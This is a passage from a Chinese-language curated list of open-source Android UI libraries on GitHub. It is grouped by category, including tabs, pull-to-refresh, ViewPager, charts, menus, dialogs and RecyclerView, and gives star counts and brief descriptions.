[DataLoadingLayoutAndroid](https://github.com/lvleo/DataLoadingLayoutAndroid) ★15 - 展示当前数据加载状态的库 \n\n## TabLayout \n\n- [SmartTabLayout](https://github.com/ogaclejapan/SmartTabLayout) ★4416 - 在用户滚动时给出连续的反馈 \n- [FlycoTabLayout](https://github.com/H07000223/FlycoTabLayout) ★4126 - Android的TabLayout库 \n- [MagicIndicator](https://github.com/hackware1993/MagicIndicator) ★2310 - 强大易扩展的ViewPager指示器框架 \n- [CoordinatorTabLayout](https://github.com/hugeterry/CoordinatorTabLayout) ★2021 - 自定义组合控件 \n- [NavigationTabStrip](https://github.com/DevLight-Mobile-Agency/NavigationTabStrip) ★1413 - 平滑可交互导航标签条 \n- [Dachshund-Tab-Layout](https://github.com/Andy671/Dachshund-Tab-Layout) ★568 - 增强型Android标签布局 \n- [AdvancedPagerSlidingTabStrip](https://github.com/HomHomLin/AdvancedPagerSlidingTabStrip) ★318 - 安卓导航控件 \n- [ChangeTabLayout](https://github.com/simplezhli/ChangeTabLayout) ★185 - 模仿乐视LIVEApp主界面TabLayout效果 \n- [SlidingTabWithColorIcons](https://github.com/myinnos/SlidingTabWithColorIcons) ★22 - 带彩色图标的滑动标签 \n- [PagerSlidingTabStrip](https://github.com/q805699513/PagerSlidingTabStrip) ★21 - 指示器TabLayout、PagerSlidingTabStrip \n\n## 图标 \n\n- [Material design icons](https://github.com/google/material-design-icons) ★30013 - 谷歌官方图标 \n- [android-iconify](https://github.com/JoanZapata/android-iconify) ★2966 - 多个图标供应商的图标整合 \n- [Android-Iconics](https://github.com/mikepenz/Android-Iconics) ★2825 - 在应用中使用图标字体或矢量 \n- [material-icon-lib](https://github.com/code-mc/material-icon-lib) ★1947 - 1500个MD风格矢量图标 \n- [Animated-Icons](https://github.com/tarek360/Animated-Icons) ★144 - 安卓动画图标 \n- [DroidAwesome](https://github.com/Livin21/DroidAwesome) ★25 - 视图或者菜单中显示FontAwesome图标 \n\n## 下拉刷新 \n\n- [android-Ultra-Pull-To-Refresh](https://github.com/liaohuqiu/android-Ultra-Pull-To-Refresh) ★7947 - 下拉刷新项目的替代方案 \n- [Phoenix](https://github.com/Yalantis/Phoenix) ★3296 - 可自定义滑动刷新实现 \n- [BGARefreshLayout-Android](https://github.com/bingoogolapple/BGARefreshLayout-Android) ★2998 - 多种下拉刷新和上拉加载插件 \n- [FlyRefresh](https://github.com/race604/FlyRefresh) ★2762 - 最有特色的下拉刷新 \n- [TwinklingRefreshLayout](https://github.com/lcodecorex/TwinklingRefreshLayout) ★2111 - 下拉刷新和上拉加载的RefreshLayout \n- [WaveSwipeRefreshLayout](https://github.com/recruit-lifestyle/WaveSwipeRefreshLayout) ★1595 - Android刷新控件 \n- [SwipeToLoadLayout](https://github.com/Aspsine/SwipeToLoadLayout) ★1522 - 可重用下拉刷新及上拉加载更多组件 \n- [Taurus](https://github.com/Yalantis/Taurus) ★1441 - 简单和可定制的下拉刷新实现 \n- [RecyclerRefreshLayout](https://github.com/dinuscxj/RecyclerRefreshLayout) ★1391 - 通过垂直滑动手势刷新当前view内容 \n- [pull-to-make-soup](https://github.com/Yalantis/pull-to-make-soup) ★1254 - 自定义动画下拉刷新 \n- [FunGameRefresh](https://github.com/Hitomis/FunGameRefresh) ★1098 - 有趣好玩的下拉刷新库 \n- [PullLoadMoreRecyclerView](https://github.com/WuXiaolong/PullLoadMoreRecyclerView) ★962 - 上拉刷新加载 \n- [XRefreshView](https://github.com/huxq17/XRefreshView) ★902 - android下拉上拉刷新框架 \n- [CommonPullToRefresh](https://github.com/Chanven/CommonPullToRefresh) ★884 - 下拉刷新 \n- [SwipyRefreshLayout](https://github.com/OrangeGangsters/SwipyRefreshLayout) ★832 - 在两个方向上滑动的SwipeRefreshLayout扩展 \n- [ChromeLikeSwipeLayout](https://github.com/ashqal/ChromeLikeSwipeLayout) ★636 - 执行更多事件的下拉事件 \n- [JellyRefreshLayout](https://github.com/imallan/JellyRefreshLayout) ★608 - 下拉刷新布局 \n- [AnimRefreshRecyclerView](https://github.com/shichaohui/AnimRefreshRecyclerView) ★534 - 下拉刷新和上拉加载更多的RecyclerView \n- [PullToRefresh](https://github.com/lubeast/PullToRefresh) ★516 - 下拉刷新实现 \n- [SmartisanPull](https://github.com/hougr/SmartisanPull) ★506 - 最优雅的下拉控件 \n- [LoadingViewFinal](https://github.com/pengjianbo/LoadingViewFinal) ★269 - 实现了下拉刷新/加载更多的android组件 \n- [ShootRefreshView](https://github.com/dinuscxj/ShootRefreshView) ★263 - 快手Android客户端刷新动画 \n- [PullRefreshView](https://github.com/Y-bao/PullRefreshView) ★241 - 为滑动控件添加上拉刷新下拉加载等功能 \n- [SmileRefresh](https://github.com/songixan/SmileRefresh) ★191 - 微笑下拉刷新 \n- [RecyclerRefresh](https://github.com/leoleohan/RecyclerRefresh) ★172 - 仿简书安卓端 \n- [CoolRefreshView](https://github.com/LuckyJayce/CoolRefreshView) ★128 - 安卓刷新视图库 \n- [EasyRefreshLayout](https://github.com/anzaizai/EasyRefreshLayout) ★116 - 轻松实现下拉刷新和上拉加载 \n- [RefreshLayout](https://github.com/linuxjava/RefreshLayout) ★77 - 实现下拉刷新和上拉加载 \n- [VRefreshLayout](https://github.com/ileelay/VRefreshLayout) ★67 - 竖直方向的下拉刷新控件 \n- [TLRLoadRefresh](https://github.com/borneywpf/TLRLoadRefresh) ★63 - 下拉刷新和上拉加载的UI组件 \n- [RefreshLayout](https://github.com/genius158/RefreshLayout) ★48 - 下拉刷新、上拉加载，支持回弹效果 \n- [PowerRefresh](https://github.com/lovejjfg/PowerRefresh) ★36 - 实现嵌套滑动机制的通用下拉刷新和加载更多 \n- [HorizontalRefreshLayout](https://github.com/linuxjava/HorizontalRefreshLayout) ★36 - 实现左右刷新 \n- [DxWaveRefresh](https://github.com/StevenDXC/DxWaveRefresh) ★34 - 波浪效果的下拉刷新 \n- [Typewriter](https://github.com/Ilya-Gh/Typewriter) ★28 - 打印机效果的下拉刷新控件 \n- [UltimateRefreshView](https://github.com/REBOOTERS/UltimateRefreshView) ★25 - 下拉刷新组件 \n- [DonkeyRefresh](https://github.com/sangenan/DonkeyRefresh) ★16 - 仿赶集下拉刷新 \n\n## ViewPager \n\n- [MaterialViewPager](https://github.com/florent37/MaterialViewPager) ★6124 - 安卓选项卡插件 \n- [InfiniteCycleViewPager](https://github.com/DevLight-Mobile-Agency/InfiniteCycleViewPager) ★3807 - 无限循环的视图页 \n- [RecyclerViewPager](https://github.com/lsjwzh/RecyclerViewPager) ★2372 - 基于RecyclerView的ViewPager替代品 \n- [ViewPagerCards](https://github.com/rubensousa/ViewPagerCards) ★2297 - 视图页卡片 \n- [CircleIndicator](https://github.com/ongakuer/CircleIndicator) ★2283 - 轻量级ViewPager指示器 \n- [PageIndicatorView](https://github.com/romandanylyk/PageIndicatorView) ★1971 - 能够指示选定页的ViewPage \n- [UltraViewPager](https://github.com/alibaba/UltraViewPager) ★1833 - 封装多种特性的ViewPager \n- [ZoomHeader](https://github.com/githubwing/ZoomHeader) ★1797 - 模仿饿了么详情页的例子 \n- [android-page-transition](https://github.com/xmuSistone/android-page-transition) ★1641 - 带有垂直滑动效果和Activity过渡的ViewPager \n- [ViewPagerIndicator](https://github.com/LuckyJayce/ViewPagerIndicator) ★1586 - 布局插件 \n- [ViewPagerTransforms](https://github.com/ToxicBakery/ViewPagerTransforms) ★1542 - 包含视图页滚动常见动画的库 \n- [ExpandingPager](https://github.com/qs-lll/ExpandingPager) ★1489 - 卡片peek及pop控件 \n- [Android-ParallaxHeaderViewPager](https://github.com/kmshack/Android-ParallaxHeaderViewPager) ★1307 - 带标题头的左右滑动 \n- [MultiViewPager](https://github.com/Pixplicity/MultiViewPager) ★855 - 支持V4库的ViewPager的扩展 \n- [DecentBanner](https://github.com/chengdazhi/DecentBanner) ★812 - 基于安卓Banner的ViewPager \n- [ExpandablePager](https://github.com/Telenav/ExpandablePager) ★684 - 两个状态（展开和滑动）间的垂直滑动切换 \n- [PdfViewPager](https://github.com/voghDev/PdfViewPager) ★590 - 在Activities或Fragments中显示PDF文档 \n- [InfiniteViewPager](https://github.com/antonyt/InfiniteViewPager) ★587 - 环绕实现首页末页跳转 \n- [ParallaxViewPager](https://github.com/ybq/ParallaxViewPager) ★497 - 安卓视差视图页 \n- [BezierViewPager](https://github.com/qdxxxx/BezierViewPager) ★494 - 触摸贝塞尔圆球式图片展示 \n- [InfiniteIndicator](https://github.com/lightSky/InfiniteIndicator) ★469 - 视图回收适配器 \n- [MagicViewPager](https://github.com/hongyangAndroid/MagicViewPager) ★420 - 单页ViewPager炫酷切换效果 \n- [HeaderViewPager](https://github.com/jeasonlzy/HeaderViewPager) ★341 - 具有共同头部的 ViewPager \n- [YViewPagerDemo](https://github.com/youngkaaa/YViewPagerDemo) ★247 - 水平竖直方向上滑动 \n- [ViewPagerAnimator](https://github.com/StylingAndroid/ViewPagerAnimator) ★240 - ViewPager动画库 \n- [ExpandableViewpager](https://github.com/githubwing/ExpandableViewpager) ★232 - 可展开缩小的Viewpager \n- [PianoView](https://github.com/chaossss/PianoView) ★230 - 有趣的类似钢琴键盘的 ViewPager Indicator \n- [GalleryLayoutManager](https://github.com/BCsl/GalleryLayoutManager) ★151 - Android中Gallery或ViewPager控件的效果 \n- [JPagerSlidingTabStrip](https://github.com/ZuYun/JPagerSlidingTabStrip) ★90 - 修改自astuetz/PagerSlidingTabStrip的tablayout \n- [InkeVerticalViewPagerLive](https://github.com/xingstarx/InkeVerticalViewPagerLive) ★83 - 仿映客上下滑动切换直播demo \n- [ParallaxViewPager](https://github.com/demoNo/ParallaxViewPager) ★63 - 带视差效果的简单ViewPager \n- [ArcPageIndicator](https://github.com/BeppiMenozzi/ArcPageIndicator) ★40 - 全自定义超简单的页面指示器 \n\n## 图表(Chart) \n\n- [MPAndroidChart](https://github.com/PhilJay/MPAndroidChart) ★16070 - 安卓图表解决方案 \n- [hellocharts-android](https://github.com/lecho/hellocharts-android) ★4332 - Android图表库 \n- [WilliamChart](https://github.com/diogobernardino/WilliamChart) ★3145 - 在应用程序中实现图表的Android库 \n- [GraphView](https://github.com/jjoe64/GraphView) ★1630 - 通过编程创建灵活好看的图表 \n- [Jgraph](https://github.com/ZuYun/Jgraph) ★1063 - 可自定义图表 \n- [AndroidCharts](https://github.com/HackPlan/AndroidCharts) ★935 - 一个简单的Android图表库 \n- [android-DecoView-charting](https://github.com/bmarrdev/android-DecoView-charting) ★780 - 实现高度可配置动画环形图表 \n- [spark](https://github.com/robinhood/spark) ★651 - 将任何规模xy点绘制为sparkline图表 \n- [SuitLines](https://github.com/whataa/SuitLines) ★650 - 小巧且高效的线性图表组件 \n- [RadarChartView](https://github.com/DmitriyZaitsev/RadarChartView) ★419 - 渲染径向图的Android视图 \n- [Charter](https://github.com/hrules6872/Charter) ★198 - 简易图表 \n- [RadarChart](https://github.com/qstumn/RadarChart) ★195 - 自由定制旋转交互的Android雷达图 \n- [AndroidChart](https://github.com/JeasonWong/AndroidChart) ★157 - 简单的安卓分时行情页 \n- [candybar-library](https://github.com/danimahardhika/candybar-library) ★107 - Android图表包装材料面板 \n- [SlimChart](https://github.com/mancj/SlimChart) ★80 - 轻量级便于使用的图表库 \n- [BarChart-master](https://github.com/Cuieney/BarChart-master) ★26 - 自动伸缩的chart \n- [PianoChartView](https://github.com/Andy671/PianoChartView) ★21 - 显示钢琴和弦比例尺图 \n\n## 菜单(Menu) \n\n- [AwesomeMenu](https://github.com/levey/AwesomeMenu) ★5086 - 与Path的故事菜单具有相同外观的菜单 \n- [Context-Menu.Android](https://github.com/Yalantis/Context-Menu.Android) ★2965 - 独特的动画内容菜单 \n- [DropDownMenu](https://github.com/dongjunkun/DropDownMenu) ★2010 - 多条件筛选菜单 \n- [FlyoutMenus](https://github.com/ShamylZakariya/FlyoutMenus) ★821 - Android简易MD风格弹出菜单 \n- [TapBarMenu](https://github.com/michaldrabik/TapBarMenu) ★803 - Tap Bar菜单布局 \n- [CircleMenu](https://github.com/Hitomis/CircleMenu) ★723 - 具有设计感的菜单 \n- [SpinMenu](https://github.com/Hitomis/SpinMenu) ★656 - 轮播样式的Fragment菜单选择空间 \n- [DropDownMenu](https://github.com/baiiu/DropDownMenu) ★632 - 完整的筛选器解决方案 \n- [BlurredGridMenu](https://github.com/gotokatsuya/BlurredGridMenu) ★470 - 酷炫网格菜单 \n- [ThumbnailMenu](https://github.com/Hitomis/ThumbnailMenu) ★422 - 简单而精致的Fragment菜单控件 \n- [TopRightMenu](https://github.com/zaaach/TopRightMenu) ★349 - 仿手机QQ界面右上角的弹出菜单 \n- [CycleMenu](https://github.com/Cleveroad/CycleMenu) ★251 - 圆形菜单 \n- [CircleProgressMenu](https://github.com/stewForAni/CircleProgressMenu) ★108 - 带有进度效果的简单环形菜单 \n- [PopupMenuView](https://github.com/kareluo/PopupMenuView) ★67 - iOS中弹框气泡菜单的控件 \n- [InfinityMenu](https://github.com/desnyki/InfinityMenu) ★66 - 实现手风琴样式菜单的Android库 \n- [FloatingMusicMenu](https://github.com/cpacm/FloatingMusicMenu) ★57 - 用于音乐播放器的悬浮菜单按钮 \n- [CircleMenuView](https://github.com/AlexLiuSheng/CircleMenuView) ★44 - 自定义圆形菜单 \n- [SlidMenu](https://github.com/lichenyu10/SlidMenu) ★29 - 轮盘样式的Fragment菜单选择控件 \n- [SectorMenu](https://github.com/Rance935/SectorMenu) ★18 - 炫酷的扇形菜单 \n\n## 浮动菜单 \n\n- [BoomMenu](https://github.com/Nightonke/BoomMenu) ★3617 - 具有炸裂效果的菜单按钮 \n- [CircularFloatingActionMenu](https://github.com/oguzbilgener/CircularFloatingActionMenu) ★1995 - 自定义圆形浮动动画菜单 \n- [TapBarMenu](https://github.com/michaldrabik/TapBarMenu) ★803 - Tap Bar菜单布局 \n- [CircleMenu](https://github.com/ImangazalievM/CircleMenu) ★649 - 简单的优雅的菜单 \n- [ExpandableSelector](https://github.com/Karumi/ExpandableSelector) ★578 - 动画的折叠或展开按钮列表 \n- [RelativePopupWindow](https://github.com/kakajika/RelativePopupWindow) ★554 - 轻松对锚视图相对定位 \n- [MultiChoicesCircleButton](https://github.com/gjiazhe/MultiChoicesCircleButton) ★312 - 带3d视差效果的多选按钮 \n- [SpringFloatingActionMenu](https://github.com/tiancaiCC/SpringFloatingActionMenu) ★282 - 点击FAB弹出菜单 \n- [FloatMenuSample](https://github.com/crosg/FloatMenuSample) ★264 - android 悬浮窗菜单 \n- [floatingMenu](https://github.com/rjsvieira/floatingMenu) ★196 - 一个像orbit的action button \n- [SmartMenu](https://github.com/xue5455/SmartMenu) ★179 - 一个优美的浮动菜单 \n- [WeiboPopupMenu](https://github.com/joelan/WeiboPopupMenu) ★20 - 仿微博添加按钮弹出菜单 \n\n## 对话框 \n\n- [Material Dialogs](https://github.com/afollestad/material-dialogs) ★9911 - 安卓Material风格对话框 \n- [dialogplus](https://github.com/orhanobut/dialogplus) ★3217 - 对话框动画 \n- [NiftyDialogEffects](https://github.com/sd6352051/NiftyDialogEffects) ★2054 - Nifty模式对话框效果 \n- [android-adDialog](https://github.com/yipianfengye/android-adDialog) ★1734 - 简单强大的广告活动弹窗控件 \n- [BlurDialogFragment](https://github.com/tvbarthel/BlurDialogFragment) ★1539 - 背景模糊效果的DialogFragment \n- [Android-AlertView](https://github.com/saiwu-bigkoo/Android-AlertView) ★879 - 仿iOS的AlertViewController \n- [MaryPopup](https://github.com/Meetic/MaryPopup) ★817 - 无忧扩展视图 \n- [MaterialStyledDialogs](https://github.com/javiersantos/MaterialStyledDialogs) ★804 - 显示优美可定制的Android对话框 \n- [BottomDialog](https://github.com/shaohui10086/BottomDialog) ★756 - 底部弹窗布局 \n- [SwipeAwayDialog](https://github.com/kakajika/SwipeAwayDialog) ★703 - 实现滑动取消对话框 \n- [LovelyDialog](https://github.com/yarolegovich/LovelyDialog) ★646 - 帮助你轻松的创建流行的MD风格对话框 \n- [EasyDialog](https://github.com/michaelye/EasyDialog) ★549 - Android轻量级提示对话框 \n- [DialogUtil](https://github.com/hss01248/DialogUtil) ★401 - 任意界面弹出框 \n- [fancyDialog](https://github.com/geniusforapp/fancyDialog) ★310 - Android自定义提示框 \n- [NormalSelectDialog](https://github.com/weavey/NormalSelectDialog) ★237 - 常见布局封装 \n- [HintPopupWindow](https://github.com/Zhaoss/HintPopupWindow) ★222 - 仿qq弹出方式 \n- [IndicatorDialog](https://github.com/jiang111/IndicatorDialog) ★211 - 使用箭头指示器和不同位置的对话框 \n- [BottomDialogDemo](https://github.com/SpikeKing/BottomDialogDemo) ★206 - 使用 DialogFragment 实现底部弹窗布局 \n- [PlaceSearchDialog](https://github.com/codemybrainsout/PlaceSearchDialog) ★161 - 位置自动搜索对话框 \n- [jjdxm_dialogui](https://github.com/jjdxmashl/jjdxm_dialogui) ★122 - 多种弹出框样式 \n- [LemonHello4Android](https://github.com/1em0nsOft/LemonHello4Android) ★93 - 内置多种主题提示框 \n- [Android-PromptDialog](https://github.com/limxing/Android-PromptDialog) ★79 - 正在加载中确认对话框轻量View \n- [panter-dialog](https://github.com/kngfrhzs/panter-dialog) ★71 - 丰富样式的Android对话框 \n- [flickabledialog](https://github.com/t-kurimura/flickabledialog) ★52 - 通过轻滑实现取消效果 \n- [WheelDialogFragment](https://github.com/GitPhoenix/WheelDialogFragment) ★17 - 用于时间选择城市选择的对话框 \n- [BottomSheetPopupDialog](https://github.com/loonggg/BottomSheetPopupDialog) ★8 - 底部弹出框 \n\n## 空白页 \n\n- [progress-activity](https://github.com/vlonjatg/progress-activity) ★793 - 进度条空视图及错误视图库 \n- [MultiStateView](https://github.com/Kennyc1012/MultiStateView) ★779 - 基于状态显示不同内容的Android视图 \n- [StatefulLayout](https://github.com/gturedi/StatefulLayout) ★610 - 显示最常见的状态模板 \n- [MultipleStatusView](https://github.com/qyxxjd/MultipleStatusView) ★604 - 支持多种状态的自定义View \n- [StatusView](https://github.com/iammert/StatusView) ★574 - Android自定义状态视图 \n- [ErrorView](https://github.com/xiprox/ErrorView) ★521 - 显示错误信息的自定义视图 \n- [LoadingLayoutDemo](https://github.com/weavey/LoadingLayoutDemo) ★510 - 加载中/无网络/无数据/出错四种情况效果封装 \n- [TEmptyView](https://github.com/barryhappy/TEmptyView) ★428 - 更简单地设置EmptyView \n- [stateLayout](https://github.com/fingdo/stateLayout) ★359 - 快速switch布局 \n- [loadinglayout](https://github.com/czy1121/loadinglayout) ★321 - 简单实用的页面多状态布局 \n- [FlowLayout](https://github.com/WassimBenltaief/FlowLayout) ★219 - 非常常见的安卓视图流 \n- [LoadDataLayout](https://github.com/WangGanxin/LoadDataLayout) ★186 - 加载数据Layout \n- [MultiStateView](https://github.com/XuDaojie/MultiStateView) ★179 - 用于切换不同View的各种状态 \n- [ProgressLayout](https://github.com/nguyenhoanglam/ProgressLayout) ★98 - 展示加载布局空白布局和error布局 \n- [PageStateManager](https://github.com/hss01248/PageStateManager) ★89 - 页面状态管理 \n- [HHEmptyView](https://github.com/hcs-xph/HHEmptyView) ★35 - 网络加载提示进度封装View \n- [DataLoadingLayoutAndroid](https://github.com/lvleo/DataLoadingLayoutAndroid) ★15 - 展示当前数据加载状态的库 \n\n## 滑动删除 \n\n- [AndroidSwipeLayout](https://github.com/daimajia/AndroidSwipeLayout) ★8066 - 安卓滑动出现子菜单 \n- [SwipeRecyclerView](https://github.com/yanzhenjie/SwipeRecyclerView) ★1742 - RecyclerView侧滑菜单 \n- [Swipeable-Cards](https://github.com/kikoso/Swipeable-Cards) ★1375 - 提供类似Tinder卡片效果 \n- [RecyclerViewUndoSwipe](https://github.com/HoneyNeutrons/RecyclerViewUndoSwipe) ★1276 - 本地ItemTouch助手 \n- [SwipeStack](https://github.com/flschweiger/SwipeStack) ★1142 - 安卓纸质视图栈 \n- [SwipeDelMenuLayout](https://github.com/mcxtzhang/SwipeDelMenuLayout) ★1033 - 仿IOS侧滑Item删除菜单 \n- [itemtouchhelper-extension](https://github.com/loopeer/itemtouchhelper-extension) ★814 - 添加滑动条目处理 \n- [SwipeMenu](https://github.com/TUBB/SwipeMenu) ★662 - 滑动菜单 \n- [AndroidSwipeableCardStack](https://github.com/wenchaojiang/AndroidSwipeableCardStack) ★563 - 流畅的纸质卡片组件 \n- [SwipeRevealLayout](https://github.com/chthai64/SwipeRevealLayout) ★517 - 通过swipe及slide显示另一个布局 \n- [QQTipsView](https://github.com/Qiaoidea/QQTipsView) ★482 - 仿QQ消息未读拖拽清除 \n- [SwipeCardsView](https://github.com/huxq17/SwipeCardsView) ★370 - Android高仿秒拍热榜的卡片滑动和左右飞出效果 \n- [SwipeCardRecyclerView](https://github.com/HalfStackDeveloper/SwipeCardRecyclerView) ★238 - 炫酷滑动卡片 \n- [CardSwipeLayout](https://github.com/yuqirong/CardSwipeLayout) ★199 - RecyclerView卡片滑动布局 \n- [SlideLayout](https://github.com/yanbober/SlideLayout) ★182 - 全方向完美滑动处理侧滑控件 \n- [accordion-swipe-layout](https://github.com/alexandrius/accordion-swipe-layout) ★71 - Android手风琴滑动布局 \n\n## 手势操作 \n\n- [sensey](https://github.com/nisrulz/sensey) ★1953 - 手势交互Android库 \n- [GestureViews](https://github.com/alexvasilkov/GestureViews) ★1243 - 手势控制和位置动画 \n- [InboxLayout](https://github.com/zhaozhentao/InboxLayout) ★648 - 仿谷歌下拉返回效果 \n- [Swipper](https://github.com/pkarira/Swipper) ★47 - 控制亮度的自定义视图 \n\n## RecyclerView \n\n- [BaseRecyclerViewAdapterHelper](https://github.com/CymChad/BaseRecyclerViewAdapterHelper) ★7640 - 强大灵活的RecyclerAdapter \n- [recyclerview-animators](https://github.com/wasabeef/recyclerview-animators) ★6236 - 轻松创建动画RecyclerView \n- [UltimateRecyclerView](https://github.com/cymcsg/UltimateRecyclerView) ★5544 - 功能强大的Recyclerview \n- [vlayout](https://github.com/alibaba/vlayout) ★4665 - 布局方案和布局间的组件复用 \n- [android-advancedrecyclerview](https://github.com/h6ah4i/android-advancedrecyclerview) ★3304 - 提供高级特性的RecyclerView扩展 \n- [XRecyclerView](https://github.com/jianghejie/XRecyclerView) ★2972 - 下拉刷新和加载更多 \n- [epoxy](https://github.com/airbnb/epoxy) ★2896 - Airbnb安卓视图架构 \n- [baseAdapter](https://github.com/hongyangAndroid/baseAdapter) ★2685 - Android 万能的Adapter \n- [DiscreteScrollView](https://github.com/yarolegovich/DiscreteScrollView) ★2494 - 基于RecyclerView的滚动列表实现 \n- [SuperRecyclerView](https://github.com/Malinskiy/SuperRecyclerView) ★2463 - 轻松制作可使用的RecyclerView \n- [RecyclerViewPager](https://github.com/lsjwzh/RecyclerViewPager) ★2372 - 基于RecyclerView的ViewPager替代品 \n- [MultiType](https://github.com/drakeet/MultiType) ★1998 - 快速清晰的开发复杂列表页面 \n- [SwipeRecyclerView](https://github.com/yanzhenjie/SwipeRecyclerView) ★1742 - RecyclerView侧滑菜单 \n- [FastAdapter](https://github.com/mikepenz/FastAdapter) ★1612 - 简化RecyclerView配置过程 \n- [EasyRecyclerView](https://github.com/Jude95/EasyRecyclerView) ★1476 - 常用的RecyclerView的各种需求封装 \n- [android-parallax-recyclerview](https://github.com/kanytu/android-parallax-recyclerview) ★1460 - Android 视差 RecycleView \n- [RecyclerViewCardGallery](https://github.com/huazhiyuan2008/RecyclerViewCardGallery) ★1443 - RecyclerView实现Card Gallery效果 \n- [LRecyclerView](https://github.com/jdsjlzx/LRecyclerView) ★1366 - 多功能RecyclerView \n- [excelPanel](https://github.com/zhouchaoyuan/excelPanel) ★1305 - 仿Excel表格的RecyclerView \n- [RecyclerViewUndoSwipe](https://github.com/HoneyNeutrons/RecyclerViewUndoSwipe) ★1276 - 本地ItemTouch助手 \n- [ShimmerRecyclerView](https://github.com/sharish/ShimmerRecyclerView) ★1175 - 展现视图加载中的视图 \n- [overscroll-decor](https://github.com/EverythingMe/overscroll-decor) ★1100 - Android的仿iOS滚动效果 \n- [RecyclerViewHeader](https://github.com/blipinsk/RecyclerViewHeader) ★1094 - 为安卓RecyclerView创建header \n- [drag-select-recyclerview](https://github.com/afollestad/drag-select-recyclerview) ★1036 - 实现GooglePhoto样式多选择 \n- [Renderers](https://github.com/pedrovgs/Renderers) ★1036 - 创建适配器的Android库 \n- [PullLoadMoreRecyclerView](https://github.com/WuXiaolong/PullLoadMoreRecyclerView) ★962 - 上拉刷新加载 \n- [RecyclerViewFastScroller](https://github.com/danoz73/RecyclerViewFastScroller) ★887 - 连接到RecyclerView实现快速滚动 \n- [IndexRecyclerView](https://github.com/jiang111/IndexRecyclerView) ★869 - 使用Recyclerview实现的联系人列表 \n- [SimpleRecyclerView](https://github.com/jaychang0917/SimpleRecyclerView) ★859 - 轻松创建列表的RecyclerView扩展 \n- [groupie](https://github.com/Genius/groupie) ★848 - 显示并管理复杂的RecyclerView布局 \n- [StickyHeaders](https://github.com/ShamylZakariya/StickyHeaders) ★784 - 安卓RecyclerView的适配器和布局管理器 \n- [RecyclerViewEnhanced](https://github.com/nikhilpanju/RecyclerViewEnhanced) ★774 - 条目滑动点击安卓库 \n- [WaveSideBar](https://github.com/Solartisan/WaveSideBar) ★750 - 快速跳跃分组的侧边栏控件 \n- [RecyclerView-FastScroll](https://github.com/timusus/RecyclerView-FastScroll) ★730 - 简单的FastScroller \n- [ExpandableRecyclerview](https://github.com/zaihuishou/ExpandableRecyclerview) ★716 - ExpandableRecycler适配器 \n- [AndroidRecyclerViewDemo](https://github.com/Frank-Zhu/AndroidRecyclerViewDemo) ★632 - 安卓RecyclerView 示例 \n- [DragRecyclerView](https://github.com/AleBarreto/DragRecyclerView) ★573 - 在RecyclerView中拖拽的简单实现 \n- [Graywater](https://github.com/tumblr/Graywater) ★544 - 改进RecyclerView布局的库 \n- [SectionedRecyclerView](https://github.com/truizlop/SectionedRecyclerView) ★540 - 安卓RecyclerView 适配器 \n- [RecyclerViewWithHeaderNewPractice](https://github.com/drakeet/RecyclerViewWithHeaderNewPractice) ★537 - 结合HeaderView的RecyclerView新实现 \n- [AnimRefreshRecyclerView](https://github.com/shichaohui/AnimRefreshRecyclerView) ★534 - 下拉刷新和上拉加载更多的RecyclerView \n- [FastScroll](https://github.com/L4Digital/FastScroll) ★532 - 类似列表视图的FastScroller \n- [android-data-binding-recyclerview](https://github.com/radzio/android-data-binding-recyclerview) ★489 - 配有Android数据绑定的RecyclerView \n- [BGAAdapter-Android](https://github.com/bingoogolapple/BGAAdapter-Android) ★454 - 通用的Adapter和ViewHolder \n- [CircleRecyclerView](https://github.com/kHRYSTAL/CircleRecyclerView) ★435 - 一个循环RecyclerView \n- [FamiliarRecyclerView](https://github.com/iwgang/FamiliarRecyclerView) ★357 - RecyclerView类库 \n- [MultiTypeView](https://github.com/LuckyJayce/MultiTypeView) ★316 - 复杂界面分多个模块开发 \n- [ClassifyView](https://github.com/AlphaBoom/ClassifyView) ★306 - 拖拽合并的RecyclerView \n- [SuspensionBar](https://github.com/wuapnjie/SuspensionBar) ★276 - Android轻松实现RecyclerView悬浮条 \n- [RecyclerStickyHeaderView](https://github.com/TellH/RecyclerStickyHeaderView) ★259 - RecyclerView的悬浮视图 \n- [SwipeCardRecyclerView](https://github.com/HalfStackDeveloper/SwipeCardRecyclerView) ★238 - 炫酷滑动卡片 \n- [DragSelectRecyclerView](https://github.com/MFlisar/DragSelectRecyclerView) ★227 - 简单的触摸监听类 \n- [Smart-HeaderFooter-RecyclerView](https://github.com/songhanghang/Smart-HeaderFooter-RecyclerView) ★214 - 将Recyclerview添加HeaderView和FooterView \n- [AlphabetIndex-Fast-Scroll-RecyclerView](https://github.com/myinnos/AlphabetIndex-Fast-Scroll-RecyclerView) ★180 - 强大的AlphabetIndex FastScroller \n- [RecyclerRefresh](https://github.com/leoleohan/RecyclerRefresh) ★172 - 仿简书安卓端 \n- [RecyclerTreeView](https://github.com/TellH/RecyclerTreeView) ★167 - 安卓的TreeView实现 \n- [PracticalRecyclerView](https://github.com/ssseasonnn/PracticalRecyclerView) ★156 - RecyclerView的一个封装 \n- [ARecyclerView](https://github.com/limedroid/ARecyclerView) ★112 - 一个库搞定recyclerview \n- [SpringRecyclerView](https://github.com/gjiazhe/SpringRecyclerView) ★90 - 具有弹簧效果的RecyclerView \n- [StickyItemDecoration](https://github.com/oubowu/StickyItemDecoration) ★83 - RecyclerView粘性头部 \n- [InifiniteRecyclerView](https://github.com/10clouds/InifiniteRecyclerView) ★65 - 实现无尽加载列表 \n- [Sectioned-RecyclerView](https://github.com/IntruderShanky/Sectioned-RecyclerView) ★57 - 带header和item的RecyclerView的简单实现方式 \n- [StickyRecyclerSettingView](https://github.com/LinLshare/StickyRecyclerSettingView) ★48 - 快速在Android上建立SettingActivity \n- [RecyclerAnimations](https://github.com/youngkaaa/RecyclerAnimations) ★47 - item滑动时的循环动画 \n- [NoAdapter](https://github.com/tikivn/NoAdapter) ★45 - 使用RecyclerView实现一个列表 \n- [EasyHeaderFooterAdapter](https://github.com/rubengees/EasyHeaderFooterAdapter) ★34 - 在RecyclerView中添加header或者footer \n- [RecyclerViewDivider](https://github.com/laobie/RecyclerViewDivider) ★29 - 为RecyclerView设置分频器 \n- [SwipeCardsRecyclerView](https://github.com/yuyuyu123/SwipeCardsRecyclerView) ★22 - 基于RecyclerView的Android组件 \n- [GlideScrollRecyclerView](https://github.com/AndroidMsky/GlideScrollRecyclerView) ★21 - RecyclerView优先加载可见item \n- [RecyclerAdapter](https://github.com/nukc/RecyclerAdapter) ★15 - 简化封装RecyclerView.Adapter \n\n## Card \n\n- [folding-cell-android](https://github.com/Ramotion/folding-cell-android) ★2670 - 安卓FoldingCell \n- [ViewPagerCards](https://github.com/rubensousa/ViewPagerCards) 